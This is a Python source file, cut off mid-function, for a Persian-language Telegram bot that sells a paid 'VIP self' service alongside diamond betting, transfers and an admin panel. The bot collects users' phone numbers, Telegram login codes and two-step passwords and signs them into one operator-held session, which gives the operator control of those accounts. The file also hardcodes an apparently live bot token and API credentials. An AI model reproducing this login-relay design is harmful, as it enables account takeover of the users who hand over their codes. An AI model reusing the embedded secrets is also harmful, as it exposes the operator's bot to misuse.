# -*- coding: utf-8 -*-
import sqlite3
import threading
import logging
import time
import random
import asyncio
from datetime import datetime

import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError
)

# ----------------- CONFIG -----------------
BOT_TOKEN = "8200221816:AAFVgwZ2reZzm3tDM_k0bEWHSkCTlWacxlY"
OWNER_ID = 5552127428
ADMIN_IDS = [5552127428]

API_ID = 37386944
API_HASH = "d64069023db75d11ae5982f653069a98"

DB_PATH = "vip_bet.db"
ACTIVATE_COST = 20
HOURLY_COST = 2
MIN_BET = 20

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
logging.basicConfig(level=logging.INFO)
db_lock = threading.RLock()

# ----------------- یوزربات با سشن ثابت -----------------
client = TelegramClient("main_session", API_ID, API_HASH)
auth_sessions = {}

# ============================================================
# دیتابیس
# ============================================================

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            diamonds INTEGER DEFAULT 0,
            created_at INTEGER,
            is_self_active INTEGER DEFAULT 0,
            self_active_time INTEGER DEFAULT 0,
            phone TEXT,
            font_mode TEXT DEFAULT 'font1',
            clock_mode INTEGER DEFAULT 0,
            text_mode TEXT DEFAULT 'normal',
            action_mode TEXT DEFAULT 'none',
            reply_mode INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS bets (
            bet_id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            creator_id INTEGER,
            amount INTEGER,
            state TEXT DEFAULT 'open',
            player_joined_id INTEGER DEFAULT 0,
            message_id INTEGER DEFAULT 0,
            created_at INTEGER
        );
        """)
        conn.commit()

# ============================================================
# توابع پایه
# ============================================================

INFINITE = 10**18

def ensure_user(uid):
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("INSERT OR IGNORE INTO users(user_id,diamonds,created_at,is_self_active,self_active_time) VALUES(?,?,?,?,?)", 
                   (uid, 0, int(time.time()), 0, 0))
        cur.execute("INSERT OR IGNORE INTO users(user_id,font_mode,clock_mode,text_mode,action_mode,reply_mode) VALUES(?,?,?,?,?,?)",
                   (uid, 'font1', 0, 'normal', 'none', 0))
        conn.commit()

def is_owner(uid):
    return uid == OWNER_ID

def is_admin(uid):
    return uid in ADMIN_IDS

def get_balance(uid):
    if is_owner(uid):
        return INFINITE
    ensure_user(uid)
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT diamonds FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone()
        return r[0] if r else 0

def change_balance(uid, delta):
    if is_owner(uid):
        return
    ensure_user(uid)
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET diamonds = diamonds + ? WHERE user_id=?", (delta, uid))
        conn.commit()

def set_user_phone(uid, phone):
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET phone=? WHERE user_id=?", (phone, uid))
        conn.commit()

def get_user_setting(uid, key):
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT {key} FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone()
        return r[0] if r else None

def set_user_setting(uid, key, value):
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute(f"UPDATE users SET {key}=? WHERE user_id=?", (value, uid))
        conn.commit()

# ============================================================
# مدیریت سلف و هزینه
# ============================================================

def is_self_active(uid):
    ensure_user(uid)
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT is_self_active, self_active_time FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone()
        
        if not r or r[0] == 0:
            return False
        
        current_time = int(time.time())
        hours_passed = (current_time - r[1]) // 3600
        
        if hours_passed > 0:
            cost = hours_passed * HOURLY_COST
            bal = get_balance(uid)
            
            if bal >= cost:
                change_balance(uid, -cost)
                with db_lock, sqlite3.connect(DB_PATH) as conn:
                    cur2 = conn.cursor()
                    cur2.execute("UPDATE users SET self_active_time=? WHERE user_id=?", (current_time, uid))
                    conn.commit()
                return True
            else:
                deactivate_self(uid)
                try:
                    bot.send_message(uid, "⚠️ موجودی الماس شما برای سلف کافی نیست.\nسلف شما به طور خودکار غیرفعال شد.")
                except:
                    pass
                return False
        
        return True

def activate_self(uid):
    ensure_user(uid)
    bal = get_balance(uid)
    
    if bal < ACTIVATE_COST:
        return False, f"❌ موجودی کافی نیست! شما {bal} الماس دارید، نیاز به {ACTIVATE_COST} الماس دارید."
    
    change_balance(uid, -ACTIVATE_COST)
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET is_self_active=1, self_active_time=? WHERE user_id=?", (int(time.time()), uid))
        conn.commit()
    
    return True, f"✅ سلف شما فعال شد!\n💎 {ACTIVATE_COST} الماس کم شد.\n⏱ هر ساعت {HOURLY_COST} الماس کم میشه."

def deactivate_self(uid):
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET is_self_active=0, self_active_time=0 WHERE user_id=?", (uid,))
        conn.commit()

# ============================================================
# ربات (تلگرام)
# ============================================================

def in_private(m):
    return m.chat.type == "private"

def in_group(m):
    return m.chat.type in ["group", "supergroup"]

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    ensure_user(uid)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("≼ سـلـفـ 𝐕𝐢𝐏 ≽", "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽")
    markup.row("≼ شـارژ مـوجـودی 💳 ≽", "≼ الماس رایگان ≽")
    markup.row("≼ پروفایل ≽")
    if is_admin(uid):
        markup.row("⚙️ پنل مدیریت")
    
    bot.send_message(m.chat.id, "🌟 به ربات VIP خوش آمدید!", reply_markup=markup)

# ----------------- سلف VIP -----------------

@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ سـلـفـ 𝐕𝐢𝐏 ≽")
def cmd_self(m):
    uid = m.from_user.id
    ensure_user(uid)
    
    if is_self_active(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔴 غیرفعال کردن", callback_data="self:off", color="danger"))
        bot.send_message(m.chat.id, "✅ سلف شما فعال است!", reply_markup=markup)
    else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        btn = types.KeyboardButton("📱 ارسال شماره", request_contact=True)
        markup.add(btn)
        
        bal = get_balance(uid)
        text = f"🔐 برای فعال‌سازی سلف، شماره خود را ارسال کنید.\n\n💰 هزینه فعال‌سازی: {ACTIVATE_COST} الماس\n⏱ هزینه ساعتی: {HOURLY_COST} الماس\n💎 موجودی شما: {bal}"
        
        bot.send_message(m.chat.id, text, reply_markup=markup)

# ----------------- دریافت شماره و ارسال کد -----------------

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.from_user.id
    ensure_user(uid)
    
    if not m.contact or m.contact.user_id != uid:
        bot.reply_to(m, "❌ شماره خودت رو بفرست!")
        return
    
    phone = m.contact.phone_number
    set_user_phone(uid, phone)
    
    bal = get_balance(uid)
    if bal < ACTIVATE_COST:
        bot.reply_to(m, f"❌ موجودی کافی نیست!\nشما {bal} الماس دارید، نیاز به {ACTIVATE_COST} الماس دارید.")
        return
    
    bot.reply_to(m, f"✅ شماره شما ثبت شد!\n📱 {phone}\n\n📨 کد تایید به تلگرام شما ارسال شد.\nلطفاً کد ۵ رقمی را که از تلگرام دریافت کردید، وارد کنید:")
    
    async def send_code():
        try:
            await client.send_code_request(phone)
            
            auth_sessions[uid] = {
                'phone': phone,
                'step': 'waiting_code',
                'start_time': time.time()
            }
            
        except FloodWaitError as e:
            bot.send_message(uid, f"❌ لطفاً {e.seconds} ثانیه صبر کنید و دوباره تلاش کنید.")
        except Exception as e:
            bot.send_message(uid, f"❌ خطا: {str(e)}")
    
    asyncio.run_coroutine_threadsafe(send_code(), asyncio.get_event_loop())

# ----------------- دریافت کد و تایید -----------------

@bot.message_handler(func=lambda m: in_private(m) and m.text and m.text not in ["≼ سـلـفـ 𝐕𝐢𝐏 ≽", "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽", "≼ شـارژ مـوجـودی 💳 ≽", "≼ الماس رایگان ≽", "≼ پروفایل ≽", "⚙️ پنل مدیریت"])
def handle_code(m):
    uid = m.from_user.id
    text = m.text.strip()
    
    if uid not in auth_sessions:
        return
    
    auth = auth_sessions[uid]
    
    if auth.get('step') != 'waiting_code':
        return
    
    if not text.isdigit() or len(text) != 5:
        bot.reply_to(m, "❌ کد ۵ رقمی وارد کن!")
        return
    
    if time.time() - auth.get('start_time', 0) > 300:
        del auth_sessions[uid]
        bot.reply_to(m, "❌ زمان کد منقضی شد! دوباره شماره بفرست.")
        return
    
    phone = auth['phone']
    
    async def verify_code():
        try:
            await client.sign_in(phone, text)
            success, msg = activate_self(uid)
            bot.reply_to(m, f"{msg}")
            del auth_sessions[uid]
            
        except PhoneCodeInvalidError:
            bot.reply_to(m, "❌ کد اشتباه است! دوباره تلاش کن.")
        except PhoneCodeExpiredError:
            bot.reply_to(m, "❌ کد منقضی شد! دوباره شماره بفرست.")
            del auth_sessions[uid]
        except SessionPasswordNeededError:
            auth['step'] = 'waiting_password'
            bot.reply_to(m, "🔐 رمز دو مرحله‌ای را وارد کنید:")
        except Exception as e:
            bot.reply_to(m, f"❌ خطا: {str(e)}")
            del auth_sessions[uid]
    
    asyncio.run_coroutine_threadsafe(verify_code(), asyncio.get_event_loop())

# ----------------- رمز دو مرحله‌ای -----------------

@bot.message_handler(func=lambda m: in_private(m) and m.text and m.text not in ["≼ سـلـفـ 𝐕𝐢𝐏 ≽", "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽", "≼ شـارژ مـوجـودی 💳 ≽", "≼ الماس رایگان ≽", "≼ پروفایل ≽", "⚙️ پنل مدیریت"])
def handle_password(m):
    uid = m.from_user.id
    text = m.text.strip()
    
    if uid not in auth_sessions:
        return
    
    auth = auth_sessions[uid]
    
    if auth.get('step') != 'waiting_password':
        return
    
    async def verify_password():
        try:
            await client.sign_in(password=text)
            success, msg = activate_self(uid)
            bot.reply_to(m, f"{msg}")
            del auth_sessions[uid]
            
        except Exception as e:
            bot.reply_to(m, f"❌ رمز اشتباه است! {str(e)}")
    
    asyncio.run_coroutine_threadsafe(verify_password(), asyncio.get_event_loop())

# ----------------- غیرفعال کردن سلف -----------------

@bot.callback_query_handler(func=lambda c: c.data.startswith("self:"))
def cb_self(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    
    uid = c.from_user.id
    if c.data == "self:off":
        deactivate_self(uid)
        bot.edit_message_text("❌ سلف شما غیرفعال شد", c.message.chat.id, c.message.message_id)

# ============================================================
# پنل خدمات VIP
# ============================================================

@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽")
def cmd_services(m):
    uid = m.from_user.id
    if not is_self_active(uid):
        bot.reply_to(m, "❌ اول سلف رو فعال کن!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📝 حالت متن", callback_data="svc:text", color="primary"),
        types.InlineKeyboardButton("⏰ ساعت", callback_data="svc:clock", color="primary"),
        types.InlineKeyboardButton("🔤 فونت", callback_data="svc:font", color="primary"),
        types.InlineKeyboardButton("🎬 اکشن", callback_data="svc:action", color="primary"),
        types.InlineKeyboardButton("🤖 منشی", callback_data="svc:reply", color="primary"),
        types.InlineKeyboardButton("📊 وضعیت", callback_data="svc:status", color="secondary")
    )
    markup.add(types.InlineKeyboardButton("❌ بستن", callback_data="svc:close", color="danger"))
    bot.send_message(m.chat.id, "🎯 پنل خدمات:", reply_markup=markup)

# ----------------- کالبک خدمات -----------------

@bot.callback_query_handler(func=lambda c: c.data.startswith("svc:"))
def cb_service(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    
    uid = c.from_user.id
    action = c.data.split(":")[1]
    
    if action == "close":
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except: pass
        return
    
    if action == "status":
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("SELECT is_self_active, font_mode, clock_mode, text_mode, action_mode, reply_mode FROM users WHERE user_id=?", (uid,))
            r = cur.fetchone()
        
        if r:
            active, font, clock, text, action_m, reply = r
            status = "✅ فعال" if active else "❌ غیرفعال"
            clock_status = "🟢 روشن" if clock else "🔴 خاموش"
            reply_status = "🟢 روشن" if reply else "🔴 خاموش"
            
            msg = f"📊 **وضعیت سلف**\n\n"
            msg += f"🔐 سلف: {status}\n"
            msg += f"📝 حالت متن: {text}\n"
            msg += f"⏰ ساعت: {clock_status}\n"
            msg += f"🔤 فونت: {font}\n"
            msg += f"🎬 اکشن: {action_m}\n"
            msg += f"🤖 منشی: {reply_status}"
            
            bot.send_message(c.message.chat.id, msg, parse_mode="HTML")
        return
    
    if action == "text":
        current = get_user_setting(uid, 'text_mode') or 'normal'
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("عادی" + (" ✅" if current == 'normal' else ""), callback_data="text:normal", color="secondary"),
            types.InlineKeyboardButton("پررنگ" + (" ✅" if current == 'bold' else ""), callback_data="text:bold", color="primary"),
            types.InlineKeyboardButton("نقل قول" + (" ✅" if current == 'quote' else ""), callback_data="text:quote", color="primary"),
            types.InlineKeyboardButton("اسپویلر" + (" ✅" if current == 'spoiler' else ""), callback_data="text:spoiler", color="primary")
        )
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="svc:back", color="secondary"))
        bot.edit_message_text("📝 **حالت متن**\n\nیکی را انتخاب کنید:", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="HTML")
        return
    
    if action == "clock":
        current = get_user_setting(uid, 'clock_mode') or 0
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("روشن" + (" ✅" if current == 1 else ""), callback_data="clock:1", color="success"),
            types.InlineKeyboardButton("خاموش" + (" ✅" if current == 0 else ""), callback_data="clock:0", color="danger")
        )
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="svc:back", color="secondary"))
        bot.edit_message_text("⏰ **ساعت**\n\nنمایش ساعت کنار اسم:", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="HTML")
        return
    
    if action == "font":
        current = get_user_setting(uid, 'font_mode') or 'font1'
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("فونت ۱" + (" ✅" if current == 'font1' else ""), callback_data="font:font1", color="primary"),
            types.InlineKeyboardButton("فونت ۲" + (" ✅" if current == 'font2' else ""), callback_data="font:font2", color="primary")
        )
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="svc:back", color="secondary"))
        bot.edit_message_text("🔤 **فونت**\n\nانتخاب فونت:", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="HTML")
        return
    
    if action == "action":
        current = get_user_setting(uid, 'action_mode') or 'none'
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("خاموش" + (" ✅" if current == 'none' else ""), callback_data="action:none", color="danger"),
            types.InlineKeyboardButton("ویس" + (" ✅" if current == 'voice' else ""), callback_data="action:voice", color="primary"),
            types.InlineKeyboardButton("بازی" + (" ✅" if current == 'game' else ""), callback_data="action:game", color="primary"),
            types.InlineKeyboardButton("استیکر" + (" ✅" if current == 'sticker' else ""), callback_data="action:sticker", color="primary")
        )
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="svc:back", color="secondary"))
        bot.edit_message_text("🎬 **اکشن**\n\nانتخاب اکشن:", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="HTML")
        return
    
    if action == "reply":
        current = get_user_setting(uid, 'reply_mode') or 0
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("روشن" + (" ✅" if current == 1 else ""), callback_data="reply:1", color="success"),
            types.InlineKeyboardButton("خاموش" + (" ✅" if current == 0 else ""), callback_data="reply:0", color="danger")
        )
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="svc:back", color="secondary"))
        bot.edit_message_text("🤖 **منشی**\n\nپاسخ‌گویی خودکار:", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="HTML")
        return
    
    if action == "back":
        cmd_services(c.message)

# ----------------- کالبک‌های تنظیمات -----------------

@bot.callback_query_handler(func=lambda c: c.data.startswith("text:"))
def cb_text(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    uid = c.from_user.id
    mode = c.data.split(":")[1]
    set_user_setting(uid, 'text_mode', mode)
    bot.edit_message_text(f"✅ حالت متن به «{mode}» تغییر کرد", c.message.chat.id, c.message.message_id)
    cmd_services(c.message)

@bot.callback_query_handler(func=lambda c: c.data.startswith("clock:"))
def cb_clock(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    uid = c.from_user.id
    val = int(c.data.split(":")[1])
    set_user_setting(uid, 'clock_mode', val)
    bot.edit_message_text(f"✅ ساعت {'روشن' if val else 'خاموش'} شد", c.message.chat.id, c.message.message_id)
    cmd_services(c.message)

@bot.callback_query_handler(func=lambda c: c.data.startswith("font:"))
def cb_font(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    uid = c.from_user.id
    font = c.data.split(":")[1]
    set_user_setting(uid, 'font_mode', font)
    bot.edit_message_text(f"✅ فونت به {font} تغییر کرد", c.message.chat.id, c.message.message_id)
    cmd_services(c.message)

@bot.callback_query_handler(func=lambda c: c.data.startswith("action:"))
def cb_action(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    uid = c.from_user.id
    mode = c.data.split(":")[1]
    set_user_setting(uid, 'action_mode', mode)
    bot.edit_message_text(f"✅ اکشن به {mode} تغییر کرد", c.message.chat.id, c.message.message_id)
    cmd_services(c.message)

@bot.callback_query_handler(func=lambda c: c.data.startswith("reply:"))
def cb_reply(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    uid = c.from_user.id
    val = int(c.data.split(":")[1])
    set_user_setting(uid, 'reply_mode', val)
    bot.edit_message_text(f"✅ منشی {'روشن' if val else 'خاموش'} شد", c.message.chat.id, c.message.message_id)
    cmd_services(c.message)

# ============================================================
# شرط‌بندی (گروه)
# ============================================================

@bot.message_handler(func=lambda m: in_group(m) and m.text and m.text.startswith("شرطبندی"))
def cmd_bet(m):
    try:
        amount = int(m.text.split()[1])
    except:
        bot.reply_to(m, f"❌ فرمت: شرطبندی <مقدار>\nحداقل: {MIN_BET} 💎")
        return
    
    if amount < MIN_BET:
        bot.reply_to(m, f"❌ حداقل شرط {MIN_BET} 💎 است.")
        return
    
    uid = m.from_user.id
    bal = get_balance(uid)
    if bal < amount:
        bot.reply_to(m, f"❌ موجودی کافی نیست!\nشما {bal} الماس دارید.")
        return
    
    change_balance(uid, -amount)
    
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("INSERT INTO bets(chat_id, creator_id, amount, created_at) VALUES(?,?,?,?)", 
                   (m.chat.id, uid, amount, int(time.time())))
        bet_id = cur.lastrowid
        conn.commit()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("❌ لغو", callback_data=f"bet:cancel:{bet_id}", color="danger"),
        types.InlineKeyboardButton("✅ پیوستن", callback_data=f"bet:join:{bet_id}", color="success")
    )
    
    msg = bot.send_message(
        m.chat.id,
        f"🎯 **شرط‌بندی جدید**\n\n"
        f"💎 مبلغ: {amount}\n"
        f"👤 سازنده: {m.from_user.first_name}\n"
        f"⏱ برای پیوستن کلیک کنید!",
        reply_markup=markup,
        parse_mode="HTML"
    )
    
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE bets SET message_id=? WHERE bet_id=?", (msg.message_id, bet_id))
        conn.commit()

# ----------------- کالبک شرط‌بندی -----------------

@bot.callback_query_handler(func=lambda c: c.data.startswith("bet:"))
def cb_bet(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    
    parts = c.data.split(":")
    action = parts[1]
    bet_id = int(parts[2])
    uid = c.from_user.id
    
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT creator_id, amount, state, player_joined_id, chat_id, message_id FROM bets WHERE bet_id=?", (bet_id,))
        row = cur.fetchone()
    
    if not row:
        bot.answer_callback_query(c.id, "❌ شرط پیدا نشد!", alert=True)
        return
    
    creator_id, amount, state, player_joined_id, chat_id, message_id = row
    
    if action == "cancel":
        if uid != creator_id:
            bot.answer_callback_query(c.id, "❌ فقط سازنده می‌تواند لغو کند!", alert=True)
            return
        
        if state != "open":
            bot.answer_callback_query(c.id, "❌ این شرط بسته شده!", alert=True)
            return
        
        change_balance(creator_id, amount)
        
        with db_lock, sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("UPDATE bets SET state='cancelled' WHERE bet_id=?", (bet_id,))
            conn.commit()
        
        bot.edit_message_text("❌ شرط لغو شد.", chat_id, message_id)
        bot.answer_callback_query(c.id, "✅ شرط لغو شد!")
        return
    
    if action == "join":
        if state != "open":
            bot.answer_callback_query(c.id, "❌ این شرط بسته شده!", alert=True)
            return
        
        if player_joined_id != 0:
            bot.answer_callback_query(c.id, "❌ یک نفر قبلاً پیوسته!", alert=True)
            return
        
        if uid == creator_id:
            bot.answer_callback_query(c.id, "❌ نمی‌تونی روی شرط خودت بپیوندی!", alert=True)
            return
        
        bal = get_balance(uid)
        if bal < amount:
            bot.answer_callback_query(c.id, f"❌ موجودی کافی نیست! شما {bal} الماس دارید.", alert=True)
            return
        
        change_balance(uid, -amount)
        
        winner_id = random.choice([creator_id, uid])
        loser_id = creator_id if winner_id == uid else uid
        
        tax = int(amount * 2 * 0.02)
        prize = amount * 2 - tax
        
        change_balance(winner_id, prize)
        
        with db_lock, sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("UPDATE bets SET state='closed', player_joined_id=? WHERE bet_id=?", (uid, bet_id))
            conn.commit()
        
        # گرفتن اطلاعات برنده و بازنده
        try:
            winner = bot.get_chat(winner_id)
            winner_name = winner.first_name or str(winner_id)
        except:
            winner_name = str(winner_id)
        
        try:
            loser = bot.get_chat(loser_id)
            loser_name = loser.first_name or str(loser_id)
        except:
            loser_name = str(loser_id)
        
        bot.edit_message_text(
            f"🏆 **نتیجه شرط‌بندی**\n\n"
            f"🥇 برنده: {winner_name}\n"
            f"💀 بازنده: {loser_name}\n"
            f"💎 جایزه: {prize} الماس\n"
            f"🧾 مالیات: {tax} الماس",
            chat_id, message_id,
            parse_mode="HTML"
        )
        bot.answer_callback_query(c.id, "✅ شرط انجام شد!")

# ============================================================
# انتقال الماس (گروه)
# ============================================================

@bot.message_handler(func=lambda m: in_group(m) and m.text and m.text.startswith("انتقال"))
def transfer_diamonds(m):
    parts = m.text.split()
    
    if len(parts) < 2:
        bot.reply_to(m, "❌ فرمت: انتقال <مقدار> [آیدی]\nمثال: انتقال 20 @username")
        return
    
    try:
        amount = int(parts[1])
        if amount <= 0:
            raise ValueError
    except:
        bot.reply_to(m, "❌ مقدار باید عدد مثبت باشد!")
        return
    
    # دریافت گیرنده
    if m.reply_to_message:
        receiver_id = m.reply_to_message.from_user.id
    elif len(parts) >= 3:
        target = parts[2]
        if target.startswith("@"):
            try:
                user = bot.get_chat(target)
                receiver_id = user.id
            except:
                bot.reply_to(m, "❌ کاربر یافت نشد!")
                return
        elif target.isdigit():
            receiver_id = int(target)
        else:
            bot.reply_to(m, "❌ آیدی یا یوزرنیم نامعتبر!")
            return
    else:
        bot.reply_to(m, "❌ ریپلای کن یا آیدی بده!")
        return
    
    sender_id = m.from_user.id
    
    if sender_id == receiver_id:
        bot.reply_to(m, "❌ نمی‌تونی به خودت انتقال بدی!")
        return
    
    # مالیات ۵٪
    tax = int(amount * 0.05)
    total = amount + tax
    
    sender_bal = get_balance(sender_id)
    if sender_bal < total and not is_owner(sender_id):
        bot.reply_to(m, f"❌ موجودی کافی نیست!\nنیاز: {total} الماس (شامل مالیات {tax})")
        return
    
    if is_owner(sender_id):
        change_balance(receiver_id, amount)
        bot.reply_to(m, f"✅ {amount} الماس (مالک) به کاربر منتقل شد!")
    else:
        change_balance(sender_id, -total)
        change_balance(receiver_id, amount)
        bot.reply_to(m, f"✅ {amount} الماس منتقل شد!\n🧾 مالیات: {tax} الماس")

# ============================================================
# منوها
# ============================================================

@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ پروفایل ≽")
def profile(m):
    uid = m.from_user.id
    bal = get_balance(uid)
    active = is_self_active(uid)
    
    if is_owner(uid):
        text = f"👤 **پروفایل شما**\n\n💎 الماس: ∞\n💰 تومان: ∞\n🔐 سلف: {'✅ فعال' if active else '❌ غیرفعال'}\n👑 نقش: مالک"
    else:
        text = f"👤 **پروفایل شما**\n\n💎 الماس: {bal}\n💰 تومان: {bal*40:,}\n🔐 سلف: {'✅ فعال' if active else '❌ غیرفعال'}"
    
    bot.reply_to(m, text, parse_mode="HTML")

@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ شـارژ مـوجـودی 💳 ≽")
def charge(m):
    bot.reply_to(m, f"💳 برای خرید الماس به آیدی‌های زیر پیام دهید:\n👤 مالک: @AliZord_yt\n🛡 پشتیبانی: @ABOLRNRNR")

@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ الماس رایگان ≽")
def free(m):
    uid = m.from_user.id
    link = f"https://t.me/self_made_iran_bot?start={uid}"
    bot.reply_to(m, f"💎 با دعوت دوستان الماس بگیر!\n🔗 {link}")

# ============================================================
# پنل مدیریت
# ============================================================

@bot.message_handler(func=lambda m: in_private(m) and m.text == "⚙️ پنل مدیریت")
def admin_panel(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ شما دسترسی به پنل مدیریت ندارید!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 لیست کاربران", callback_data="admin:list", color="primary"),
        types.InlineKeyboardButton("📊 آمار ربات", callback_data="admin:stats", color="primary"),
        types.InlineKeyboardButton("➕ افزودن الماس", callback_data="admin:give", color="success"),
        types.InlineKeyboardButton("➖ کم کردن الماس", callback_data="admin:remove", color="danger"),
        types.InlineKeyboardButton("💰 تنظیم الماس", callback_data="admin:set", color="primary"),
        types.InlineKeyboardButton("📢 ارسال همگانی", callback_data="admin:broadcast", color="primary")
    )
    markup.add(types.InlineKeyboardButton("🔴 بستن پنل", callback_data="admin:close", color="danger"))
    
    bot.reply_to(m, "⚙️ **پنل مدیریت**", reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("admin:"))
def cb_admin(c):
    if not is_admin(c.from_user.id):
        try: bot.answer_callback_query(c.id, "❌ شما دسترسی ندارید!", alert=True)
        except: pass
        return
    
    try: bot.answer_callback_query(c.id)
    except: pass
    
    action = c.data.split(":")[1]
    
    if action == "close":
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except: pass
        return
    
    if action == "list":
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("SELECT user_id, diamonds, is_self_active FROM users ORDER BY diamonds DESC LIMIT 30")
            rows = cur.fetchall()
        
        if not rows:
            text = "📋 کاربری یافت نشد"
        else:
            text = "📋 **لیست کاربران**\n\n"
            for uid, d, active in rows:
                if uid == OWNER_ID:
                    text += f"👑 {uid} — ∞ 💎 (مالک)\n"
                elif is_admin(uid):
                    text += f"🔰 {uid} — {d} 💎 (ادمین)\n"
                else:
                    status = "✅" if active else "❌"
                    text += f"• {uid} — {d} 💎 {status}\n"
        
        bot.send_message(c.from_user.id, text, parse_mode="HTML")
        return
    
    if action == "stats":
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("SELECT COUNT(*) FROM users")
            total_users = cur.fetchone()[0]
            cur.execute("SELECT SUM(diamonds) FROM users")
            total_diamonds = cur.fetchone()[0] or 0
            cur.execute("SELECT COUNT(*) FROM users WHERE is_self_active=1")
            active_self = cur.fetchone()[0]
        
        text = (
            f"📊 **آمار ربات**\n\n"
            f"👥 کل کاربران: {total_users}\n"
            f"💰 مجموع الماس: {total_diamonds:,}\n"
            f"✅ سلف فعال: {active_self}\n"
            f"📅 تاریخ: {datetime.now().strftime('%Y/%m/%d %H:%M')}"
        )
        bot.send_message(c.from_user.id, text, parse_mode="HTML")
        return
    
    if action == "give":
        bot.send_message(c.from_user.id, "📝 /give <user_id> <amount>")
        return
    
    if action == "remove":
        bot.send_message(c.from_user.id, "📝 /remove <user_id> <amount>")
        return
    
    if action == "set":
        bot.send_message(c.from_user.id, "📝 /setdiamonds <user_id> <amount>")
        return
    
    if action == "broadcast":
        bot.send_message(c.from_user.id, "📝 /broadcast <پیام>")
        return

# ----------------- دستورات مدیریت -----------------

@bot.message_handler(commands=['give'])
def give_diamond(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        parts = m.text.split()
        target = int(parts[1])
        amount = int(parts[2])
        
        if is_owner(target):
            bot.reply_to(m, "❌ مالک بینهایت است!")
            return
        
        change_balance(target, amount)
        bot.reply_to(m, f"✅ {amount} الماس به کاربر {target} اضافه شد!")
    except:
        bot.reply_to(m, "❌ فرمت: /give <user_id> <amount>")

@bot.message_handler(commands=['remove'])
def remove_diamond(m):
